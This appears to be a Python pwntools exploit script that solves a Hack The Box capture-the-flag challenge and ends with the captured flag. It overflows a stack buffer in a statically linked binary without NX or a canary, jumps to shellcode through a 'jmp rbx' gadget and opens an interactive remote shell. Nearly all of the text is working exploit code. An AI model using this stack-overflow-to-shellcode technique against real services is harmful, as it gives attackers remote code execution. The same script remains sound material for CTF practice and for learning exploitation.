from pwn import * 

context.arch = 'amd64'

'''
statically linked binary 
mitigation: 
ASLR 
NO PIE
NO CANARY
NO NX


goal : put shellcode on the stack and jump on the shellcode but no leak

EBX is set to the shellcode adresse during crash 

find and jmp gadget(jmp rbx) and done


0x000000000047e0eb: jmp rbx;

'''

p = remote("IP",44808)
shellcode = asm(shellcraft.sh())
padd= b'A'*24

payload = padd + p64(0x000000000047e0eb)+b'\x90'*40 + shellcode

p.sendline(payload)
p.interactive()

# HTB{5t4t1c4lly_l1nk3d_jmp_r4x_sc}